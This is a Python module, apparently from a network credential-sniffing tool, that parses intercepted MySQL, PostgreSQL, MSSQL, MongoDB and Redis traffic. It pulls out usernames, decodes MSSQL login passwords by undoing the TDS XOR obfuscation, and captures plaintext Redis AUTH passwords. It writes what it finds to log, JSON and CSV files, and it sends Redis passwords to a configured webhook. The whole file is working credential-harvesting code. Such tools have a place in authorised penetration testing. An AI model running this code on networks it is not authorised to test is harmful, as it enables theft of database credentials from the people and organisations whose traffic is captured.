"""
Database protocol parsers
Handles MySQL, PostgreSQL, MSSQL, MongoDB, Redis
"""

import re
import struct
import codecs
from datetime import datetime

from ..utils import is_credential_duplicate, analyze_password_strength
from ..output import send_webhook_alert


def parse_mysql(data, src_ip, dst_ip, src_port, dst_port, config):
    """Parse MySQL authentication packets"""
    if len(data) > 40:
        try:
            if data[4:5] == b'\x85' or data[4:5] == b'\x8d':
                offset = 32
                username_end = data.find(b'\x00', offset)
                if username_end > offset:
                    username = data[offset:username_end].decode('latin-1', errors='ignore')
                    if len(username) > 0 and username.isprintable():
                        message = f'Found MySQL authentication: {username}\n'
                        
                        if not is_credential_duplicate(username, "mysql_auth", config['deduplicate']):
                            config['text_writer'].write_to_file("logs/MySQL-Auth.txt", message, username)
                            
                            cred_dict = {
                                "timestamp": datetime.now().isoformat(),
                                "protocol": "MySQL",
                                "src_ip": src_ip,
                                "src_port": src_port,
                                "dst_ip": dst_ip,
                                "dst_port": dst_port,
                                "credential_type": "auth_packet",
                                "username": username,
                                "password": "hashed",
                            }
                            config['json_writer'].write(cred_dict)
                            config['csv_writer'].write(cred_dict["timestamp"], "MySQL", src_ip, src_port, dst_ip, dst_port, "auth_packet", username, "hashed", "Password hashed")
                            
                            if config['verbose']:
                                print(f"tcp {src_ip}:{src_port} > {dst_ip}:{dst_port}\n{message}")
        except:
            pass


def parse_postgresql(data, src_ip, dst_ip, src_port, dst_port, config):
    """Parse PostgreSQL authentication"""
    if len(data) > 20:
        try:
            if data[4:8] == b'\x00\x03\x00\x00':
                params_data = data[8:]
                params = {}
                offset = 0
                while offset < len(params_data):
                    key_end = params_data.find(b'\x00', offset)
                    if key_end == -1:
                        break
                    key = params_data[offset:key_end].decode('latin-1', errors='ignore')
                    if key == '':
                        break
                    
                    offset = key_end + 1
                    value_end = params_data.find(b'\x00', offset)
                    if value_end == -1:
                        break
                    value = params_data[offset:value_end].decode('latin-1', errors='ignore')
                    params[key] = value
                    offset = value_end + 1
                
                if 'user' in params:
                    username = params['user']
                    database = params.get('database', 'N/A')
                    message = f'Found PostgreSQL connection: user={username}, database={database}\n'
                    
                    if not is_credential_duplicate(username, database, config['deduplicate']):
                        config['text_writer'].write_to_file("logs/PostgreSQL-Auth.txt", message, username)
                        
                        cred_dict = {
                            "timestamp": datetime.now().isoformat(),
                            "protocol": "PostgreSQL",
                            "src_ip": src_ip,
                            "src_port": src_port,
                            "dst_ip": dst_ip,
                            "dst_port": dst_port,
                            "credential_type": "connection",
                            "username": username,
                            "password": "N/A",
                        }
                        config['json_writer'].write(cred_dict)
                        config['csv_writer'].write(cred_dict["timestamp"], "PostgreSQL", src_ip, src_port, dst_ip, dst_port, "connection", username, "N/A", f"DB: {database}")
                        
                        if config['verbose']:
                            print(f"tcp {src_ip}:{src_port} > {dst_ip}:{dst_port}\n{message}")
        except:
            pass


def parse_mssql_plaintext(data, config):
    """Parse MSSQL plaintext password"""
    def parse_sql_clear_txt_pwd(pwd):
        pwd_str = pwd.decode('latin-1')
        pwd_map = map(ord, pwd_str.replace('\xa5', ''))
        pw = b''
        for x in pwd_map:
            pw += codecs.decode(hex(x ^ 0xa5)[::-1][:2].replace("x", "0"), 'hex')
        return pw.decode('latin-1')
    
    username_offset = struct.unpack('<h', data[48:50])[0]
    pwd_offset = struct.unpack('<h', data[52:54])[0]
    app_offset = struct.unpack('<h', data[56:58])[0]
    pwd_len = app_offset - pwd_offset
    username_len = pwd_offset - username_offset
    pwd_str = parse_sql_clear_txt_pwd(data[8+pwd_offset:8+pwd_offset+pwd_len])
    username = data[8+username_offset:8+username_offset+username_len].decode('utf-16le')
    config['text_writer'].write_to_file("logs/MSSQL-Plaintext.txt", "MSSQL Username: %s Password: %s" % (username, pwd_str), username)
    return "MSSQL Username: %s Password: %s\n" % (username, pwd_str)


def parse_redis(data, src_ip, dst_ip, src_port, dst_port, config):
    """Parse Redis AUTH commands"""
    if b'AUTH' in data:
        auth_match = re.search(b'AUTH\r\n\$([0-9]+)\r\n([^\r]+)', data)
        if auth_match:
            password_len = int(auth_match.group(1))
            password = auth_match.group(2).decode('latin-1', errors='ignore')[:password_len]
            
            message = f'Found Redis AUTH password: {password}\n'
            
            if not is_credential_duplicate("redis", password, config['deduplicate']):
                config['text_writer'].write_to_file("logs/Redis-Auth.txt", message, password)
                
                strength = analyze_password_strength(password)
                
                cred_dict = {
                    "timestamp": datetime.now().isoformat(),
                    "protocol": "Redis",
                    "src_ip": src_ip,
                    "src_port": src_port,
                    "dst_ip": dst_ip,
                    "dst_port": dst_port,
                    "credential_type": "plaintext",
                    "username": "redis",
                    "password": password,
                    "privileged": True
                }
                config['json_writer'].write(cred_dict)
                config['csv_writer'].write(cred_dict["timestamp"], "Redis", src_ip, src_port, dst_ip, dst_port, "plaintext", "redis", password, f"Strength: {strength['score']}")
                send_webhook_alert(config['webhook_url'], cred_dict, config['verbose'])
                
                if config['verbose']:
                    print(f"tcp {src_ip}:{src_port} > {dst_ip}:{dst_port}\n{message}")


def parse_mongodb(data, src_ip, dst_ip, src_port, dst_port, config):
    """Parse MongoDB authentication"""
    if len(data) > 50:
        if b'saslStart' in data or b'authenticate' in data:
            username_match = re.search(b'n=([^,]+)', data)
            if username_match:
                username = username_match.group(1).decode('latin-1', errors='ignore')
                message = f'Found MongoDB authentication: {username}\n'
                
                if not is_credential_duplicate(username, "mongodb_auth", config['deduplicate']):
                    config['text_writer'].write_to_file("logs/MongoDB-Auth.txt", message, username)
                    
                    cred_dict = {
                        "timestamp": datetime.now().isoformat(),
                        "protocol": "MongoDB",
                        "src_ip": src_ip,
                        "src_port": src_port,
                        "dst_ip": dst_ip,
                        "dst_port": dst_port,
                        "credential_type": "scram_auth",
                        "username": username,
                        "password": "hashed",
                    }
                    config['json_writer'].write(cred_dict)
                    config['csv_writer'].write(cred_dict["timestamp"], "MongoDB", src_ip, src_port, dst_ip, dst_port, "scram_auth", username, "hashed", "SCRAM auth")
                    
                    if config['verbose']:
                        print(f"tcp {src_ip}:{src_port} > {dst_ip}:{dst_port}\n{message}")
